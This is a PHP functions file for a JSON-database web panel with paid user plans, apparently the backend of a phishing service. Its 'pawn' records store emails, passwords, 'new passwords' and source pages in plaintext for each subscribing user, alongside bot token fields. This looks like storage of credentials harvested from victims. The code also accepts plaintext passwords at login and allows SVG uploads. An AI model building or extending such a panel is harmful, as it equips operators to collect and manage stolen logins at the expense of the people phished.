<?php
// functions.php - Complete Fixed Version
// JSON Database functions

function getJsonData() {
    $jsonFile = __DIR__ . '/db.json';
    if (!file_exists($jsonFile)) {
        return ['users' => [], 'pawns' => [], 'metadata' => ['version' => '1.0', 'created_at' => date('c'), 'last_updated' => date('c')]];
    }
    $data = json_decode(file_get_contents($jsonFile), true);
    return $data ?: ['users' => [], 'pawns' => [], 'metadata' => ['version' => '1.0', 'created_at' => date('c'), 'last_updated' => date('c')]];
}

function saveJsonData($data) {
    $data['metadata']['last_updated'] = date('c');
    $jsonFile = __DIR__ . '/db.json';
    return file_put_contents($jsonFile, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

function generateId($table) {
    $data = getJsonData();
    $maxId = 0;
    foreach ($data[$table] as $item) {
        if (isset($item['id']) && $item['id'] > $maxId) {
            $maxId = $item['id'];
        }
    }
    return $maxId + 1;
}

// Allowed file types for upload validation
$ALLOWED_IMAGE_TYPES = [
    'jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp', 'tiff', 'svg'
];

$ALLOWED_MIME_TYPES = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/webp',
    'image/bmp',
    'image/tiff',
    'image/svg+xml'
];

// Function to check if file is an image
function isImageFile($filename, $mime_type = null) {
    global $ALLOWED_IMAGE_TYPES, $ALLOWED_MIME_TYPES;

    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    if (!in_array($extension, $ALLOWED_IMAGE_TYPES)) {
        return false;
    }

    if ($mime_type && !in_array($mime_type, $ALLOWED_MIME_TYPES)) {
        return false;
    }

    return true;
}

function getFileExtension($filename) {
    return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
}

function validateImageUpload($file) {
    global $ALLOWED_IMAGE_TYPES, $ALLOWED_MIME_TYPES;

    if (!isset($file['name']) || !isset($file['type']) || !isset($file['tmp_name'])) {
        return ['valid' => false, 'error' => 'Invalid file upload'];
    }

    if ($file['error'] !== UPLOAD_ERR_OK) {
        return ['valid' => false, 'error' => 'Upload error: ' . $file['error']];
    }

    $max_size = 5 * 1024 * 1024;
    if ($file['size'] > $max_size) {
        return ['valid' => false, 'error' => 'File too large. Maximum size is 5MB'];
    }

    if (!isImageFile($file['name'], $file['type'])) {
        return ['valid' => false, 'error' => 'Only image files are allowed'];
    }

    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $actual_mime = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);

    if (!in_array($actual_mime, $ALLOWED_MIME_TYPES)) {
        return ['valid' => false, 'error' => 'File type mismatch'];
    }

    return ['valid' => true, 'extension' => getFileExtension($file['name']), 'mime_type' => $actual_mime];
}

// ========== USER FUNCTIONS ==========

function createuser($name, $email, $password, $token, $device, $bot_token = null, $bot_id = null, $enableemail = 0) {
    $data = getJsonData();
    $hashed_password = password_hash($password, PASSWORD_DEFAULT);
    $isFirstUser = empty($data['users']);

    $user = [
        'id' => generateId('users'),
        'name' => $name,
        'email' => $email,
        'password' => $hashed_password,
        'token' => $token,
        'device' => $device,
        'bot_token' => $bot_token,
        'bot_id' => $bot_id,
        'enableemail' => $enableemail,
        'count' => 4,
        'project' => 1,
        'emailsend' => 0,
        'is_admin' => $isFirstUser ? 1 : 0,
        'time_pay' => date('Y-m-d H:i:s'),
        'created_at' => date('Y-m-d H:i:s'),
        'dev' => null
    ];
    $data['users'][] = $user;
    saveJsonData($data);
    return $user;
}

function readuser($id) {
    $data = getJsonData();
    $userIdInt = (int)$id;
    foreach ($data['users'] as $user) {
        if ((int)$user['id'] === $userIdInt) {
            return $user;
        }
    }
    return null;
}

function readuserByEmail($email) {
    $data = getJsonData();
    foreach ($data['users'] as $user) {
        if ($user['email'] == $email) {
            return $user;
        }
    }
    return null;
}

function updateuser($id, $name = null, $email = null, $password = null, $token = null, $device = null, $bot_token = null, $bot_id = null, $enableemail = null, $count = null, $is_admin = null) {
    $data = getJsonData();
    $userIdInt = (int)$id;
    $updated = false;
    
    foreach ($data['users'] as &$user) {
        if ((int)$user['id'] === $userIdInt) {
            if ($name !== null) $user['name'] = $name;
            if ($email !== null) $user['email'] = $email;
            if ($password !== null) $user['password'] = password_hash($password, PASSWORD_DEFAULT);
            if ($token !== null) $user['token'] = $token;
            if ($device !== null) $user['device'] = $device;
            if ($bot_token !== null) $user['bot_token'] = $bot_token;
            if ($bot_id !== null) $user['bot_id'] = $bot_id;
            if ($enableemail !== null) $user['enableemail'] = $enableemail;
            if ($count !== null) $user['count'] = (int)$count;
            if ($is_admin !== null) $user['is_admin'] = (int)$is_admin;
            $updated = true;
            break;
        }
    }
    
    if ($updated) {
        return saveJsonData($data);
    }
    return false;
}

function updateuserCount($id, $count) {
    $data = getJsonData();
    $userIdInt = (int)$id;
    
    foreach ($data['users'] as &$user) {
        if ((int)$user['id'] === $userIdInt) {
            $user['count'] = (int)$count;
            $user['time_pay'] = date('Y-m-d H:i:s');
            return saveJsonData($data);
        }
    }
    return false;
}

function updateuserProjectLimit($id, $limit) {
    $data = getJsonData();
    $userIdInt = (int)$id;
    
    foreach ($data['users'] as &$user) {
        if ((int)$user['id'] === $userIdInt) {
            $user['project'] = (int)$limit;
            $user['time_pay'] = date('Y-m-d H:i:s');
            return saveJsonData($data);
        }
    }
    return false;
}

function updateuserPlanUpgrade($id, $count, $project) {
    $data = getJsonData();
    $userIdInt = (int)$id;
    
    foreach ($data['users'] as &$user) {
        if ((int)$user['id'] === $userIdInt) {
            $user['count'] = (int)$count;
            $user['project'] = (int)$project;
            
            // Count pawns with proper type casting
            $pawnCount = 0;
            foreach ($data['pawns'] as $pawn) {
                if ((int)$pawn['user_id'] === $userIdInt) {
                    $pawnCount++;
                }
            }
            
            $user['emailsend'] = $user['count'] - $pawnCount > 0 ? $user['count'] - $pawnCount : $user['count'];
            $user['time_pay'] = date('Y-m-d H:i:s');
            return saveJsonData($data);
        }
    }
    return false;
}

function updateemailsend($id, $emailsend) {
    $data = getJsonData();
    $userIdInt = (int)$id;
    
    foreach ($data['users'] as &$user) {
        if ((int)$user['id'] === $userIdInt) {
            $user['emailsend'] = (int)$emailsend;
            return saveJsonData($data);
        }
    }
    return false;
}

function checkAndResetExpiredSubscription($userId) {
    $data = getJsonData();
    $userIdInt = (int)$userId;
    
    foreach ($data['users'] as &$user) {
        if ((int)$user['id'] === $userIdInt && isset($user['time_pay'])) {
            $timePay = strtotime($user['time_pay']);
            $thirtyDaysAgo = strtotime('-30 days');

            if ($timePay < $thirtyDaysAgo) {
                $user['count'] = 4;
                saveJsonData($data);
                return true;
            }
        }
    }
    return false;
}

function deleteuser($id) {
    $data = getJsonData();
    $userIdInt = (int)$id;
    $userFound = false;
    
    // Remove user
    foreach ($data['users'] as $key => $user) {
        if ((int)$user['id'] === $userIdInt) {
            unset($data['users'][$key]);
            $userFound = true;
            break;
        }
    }
    
    if (!$userFound) return false;
    
    // Reindex users array
    $data['users'] = array_values($data['users']);
    
    // Remove all pawns belonging to this user
    $data['pawns'] = array_values(array_filter($data['pawns'], function($pawn) use ($userIdInt) {
        return (int)$pawn['user_id'] !== $userIdInt;
    }));
    
    return saveJsonData($data);
}

// ========== PAWN FUNCTIONS ==========

function createpawn($user_id, $email, $password, $page, $newpassword = null) {
    $data = getJsonData();
    $pawn = [
        'id' => generateId('pawns'),
        'user_id' => (int)$user_id,  // Force integer
        'email' => $email,
        'password' => $password,
        'newpassword' => $newpassword,
        'page' => $page,
        'created_at' => date('Y-m-d H:i:s')
    ];
    $data['pawns'][] = $pawn;
    return saveJsonData($data);
}

function readpawn($user_id) {
    $data = getJsonData();
    $userPawns = [];
    $userIdInt = (int)$user_id;
    
    foreach ($data['pawns'] as $pawn) {
        if ((int)$pawn['user_id'] === $userIdInt) {
            $userPawns[] = $pawn;
        }
    }
    
    usort($userPawns, function($a, $b) {
        return strtotime($a['created_at']) - strtotime($b['created_at']);
    });
    
    return $userPawns;
}

function updatepawn($id, $user_id = null, $email = null, $password = null, $newpassword = null) {
    $data = getJsonData();
    $pawnIdInt = (int)$id;
    
    foreach ($data['pawns'] as &$pawn) {
        if ((int)$pawn['id'] === $pawnIdInt) {
            if ($user_id !== null) $pawn['user_id'] = (int)$user_id;
            if ($email !== null) $pawn['email'] = $email;
            if ($password !== null) $pawn['password'] = $password;
            if ($newpassword !== null) $pawn['newpassword'] = $newpassword;
            return saveJsonData($data);
        }
    }
    return false;
}

function deletepawn($id) {
    $data = getJsonData();
    $pawnIdInt = (int)$id;
    $imagePath = null;
    $isImage = false;

    // Check if it's an image pawn and get the path
    foreach ($data['pawns'] as $pawn) {
        if ((int)$pawn['id'] === $pawnIdInt) {
            $isImage = (strpos(strtolower($pawn['page']), 'image') !== false || strpos(strtolower($pawn['page']), 'photo') !== false);
            if ($isImage && !empty($pawn['email'])) {
                $imagePath = $pawn['email'];
            }
            break;
        }
    }

    // Delete image file if exists
    if ($isImage && $imagePath && !preg_match('/^https?:\/\//', $imagePath)) {
        $fullPath = __DIR__ . '/../uploads/' . basename($imagePath);
        if (file_exists($fullPath)) {
            unlink($fullPath);
        }
    }

    // Remove the pawn from JSON
    foreach ($data['pawns'] as $key => $pawn) {
        if ((int)$pawn['id'] === $pawnIdInt) {
            unset($data['pawns'][$key]);
            $data['pawns'] = array_values($data['pawns']);
            return saveJsonData($data);
        }
    }
    
    return false;
}

// ========== HELPER FUNCTIONS FOR ADMIN ==========

function cleanupOrphanedPawns() {
    $data = getJsonData();
    $validUserIds = array_map('intval', array_column($data['users'], 'id'));
    $originalCount = count($data['pawns']);
    
    $data['pawns'] = array_values(array_filter($data['pawns'], function($pawn) use ($validUserIds) {
        return in_array((int)$pawn['user_id'], $validUserIds);
    }));
    
    $cleanedCount = $originalCount - count($data['pawns']);
    
    if ($cleanedCount > 0) {
        saveJsonData($data);
    }
    
    return $cleanedCount;
}

function getAllUsersWithPawns() {
    $data = getJsonData();
    $users = $data['users'];
    
    // First, ensure all pawn user_ids are integers
    foreach ($data['pawns'] as &$pawn) {
        $pawn['user_id'] = (int)$pawn['user_id'];
    }
    
    foreach ($users as &$user) {
        $userIdInt = (int)$user['id'];
        $user['pawns'] = [];
        
        // Collect pawns for this user
        foreach ($data['pawns'] as $pawn) {
            if ((int)$pawn['user_id'] === $userIdInt) {
                $user['pawns'][] = $pawn;
            }
        }
        
        // Sort pawns by created_at DESC
        usort($user['pawns'], function($a, $b) {
            return strtotime($b['created_at']) - strtotime($a['created_at']);
        });
        
        $user['pawn_count'] = count($user['pawns']);
        
        // Check if subscription is expired (30 days)
        $user['is_expired'] = 0;
        if (isset($user['time_pay']) && !empty($user['time_pay'])) {
            $timePay = strtotime($user['time_pay']);
            $thirtyDaysAgo = strtotime('-30 days');
            if ($timePay < $thirtyDaysAgo) {
                $user['is_expired'] = 1;
            }
        }
    }
    
    // Sort users by created_at DESC
    usort($users, function($a, $b) {
        return strtotime($b['created_at'] ?? '1970-01-01') - strtotime($a['created_at'] ?? '1970-01-01');
    });
    
    return $users;
}

function getUserWithPawns($userId) {
    $data = getJsonData();
    $user = null;
    $userIdInt = (int)$userId;
    
    // Find user
    foreach ($data['users'] as $u) {
        if ((int)$u['id'] === $userIdInt) {
            $user = $u;
            break;
        }
    }
    
    if (!$user) return null;
    
    // Add pawns with proper type casting
    $user['pawns'] = [];
    foreach ($data['pawns'] as $pawn) {
        if ((int)$pawn['user_id'] === $userIdInt) {
            $user['pawns'][] = $pawn;
        }
    }
    
    // Sort pawns by created_at DESC
    usort($user['pawns'], function($a, $b) {
        return strtotime($b['created_at']) - strtotime($a['created_at']);
    });
    
    $user['pawn_count'] = count($user['pawns']);
    
    return $user;
}

function fixPawnUserIds() {
    $data = getJsonData();
    $changed = false;
    
    foreach ($data['pawns'] as &$pawn) {
        if (is_string($pawn['user_id'])) {
            $pawn['user_id'] = (int)$pawn['user_id'];
            $changed = true;
        }
    }
    
    if ($changed) {
        saveJsonData($data);
    }
    
    return $changed;
}

// ========== AUTHENTICATION ==========

function authenticate($email, $password) {
    $user = readuserByEmail($email);
    if ($user) {
        if (strpos($user['password'], '$2y$') === 0) {
            if (password_verify($password, $user['password'])) {
                return $user;
            }
        } else {
            if ($password === $user['password']) {
                return $user;
            }
        }
    }
    return false;
}

// ========== FILE UPLOAD ==========

function uploadFile($file, $folder = "../uploads/") {
    if (!file_exists($folder)) {
        mkdir($folder, 0755, true);
    }

    $extension = getFileExtension($file['name']);
    $secureFileName = time() . "_" . bin2hex(random_bytes(8)) . "." . $extension;
    $targetPath = $folder . $secureFileName;

    if (move_uploaded_file($file["tmp_name"], $targetPath)) {
        return [
            'success' => true,
            'path' => $targetPath,
            'filename' => $secureFileName,
            'extension' => $extension,
            'mime_type' => $file['type']
        ];
    }

    return ['success' => false, 'error' => 'Failed to move uploaded file'];
}

// ========== EMAIL FUNCTIONS ==========

function sendUpgradeThankYouEmail($userEmail, $userName, $planName, $newCardLimit, $newProjectLimit) {
    include_once '../mail/send.php';
    
    $cardLimitText = $newCardLimit >= 999999 ? 'Unlimited' : number_format($newCardLimit);
    
    $subject = "🎉 Welcome to {$planName} - Your Account Has Been Upgraded!";
    
    $body = "
    <!DOCTYPE html>
    <html lang='en'>
    <head>
        <meta charset='UTF-8'>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <title>Account Upgraded</title>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
            .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
            .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 40px 30px; text-align: center; }
            .header h1 { margin: 0; font-size: 28px; font-weight: 700; }
            .header p { margin: 10px 0 0 0; opacity: 0.9; font-size: 16px; }
            .content { padding: 40px 30px; color: #333; line-height: 1.6; }
            .welcome { font-size: 24px; font-weight: 600; color: #667eea; margin-bottom: 20px; }
            .plan-details { background: #f8f9ff; border-left: 4px solid #667eea; padding: 25px; margin: 25px 0; border-radius: 8px; }
            .plan-details h3 { margin: 0 0 15px 0; color: #667eea; font-size: 20px; }
            .plan-details ul { margin: 0; padding-left: 20px; }
            .plan-details li { margin-bottom: 8px; font-weight: 500; }
            .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
            .feature { background: #f8f9ff; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #e0e6ff; }
            .feature-icon { font-size: 32px; margin-bottom: 10px; }
            .feature h4 { margin: 0 0 8px 0; color: #667eea; font-size: 16px; }
            .feature p { margin: 0; color: #666; font-size: 14px; }
            .cta { text-align: center; margin: 40px 0; }
            .cta a { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px 30px; text-decoration: none; border-radius: 50px; font-weight: 600; display: inline-block; box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4); }
            .footer { background: #f8f9ff; padding: 30px; text-align: center; color: #666; }
            .footer p { margin: 0; font-size: 14px; }
            .footer a { color: #667eea; text-decoration: none; font-weight: 500; }
            .highlight { color: #667eea; font-weight: 700; }
        </style>
    </head>
    <body>
        <div class='container'>
            <div class='header'>
                <h1>🎉 Upgrade Complete!</h1>
                <p>Your account has been successfully upgraded</p>
            </div>
            
            <div class='content'>
                <div class='welcome'>Hello {$userName}!</div>
                
                <p>Thank you for upgrading to our <span class='highlight'>{$planName}</span>! We're excited to have you as a premium member.</p>
                
                <div class='plan-details'>
                    <h3>📋 Your New Plan Details</h3>
                    <ul>
                        <li><strong>Plan:</strong> {$planName}</li>
                        <li><strong>Card Limit:</strong> {$cardLimitText} cards per view</li>
                        <li><strong>Project Limit:</strong> {$newProjectLimit} projects</li>
                        <li><strong>Status:</strong> <span style='color: #28a745; font-weight: 700;'>ACTIVE</span></li>
                    </ul>
                </div>
                
                <div class='cta'>
                    <a href='../'>Start Using Your Premium Features</a>
                </div>
            </div>
            
            <div class='footer'>
                <p>Thank you for choosing our service! 🎉</p>
                <p>Need help? <a href='mailto:support@pawn.com'>Contact Support</a></p>
            </div>
        </div>
    </body>
    </html>
    ";
    
    return sendEmail($userEmail, $body, $subject);
}

?>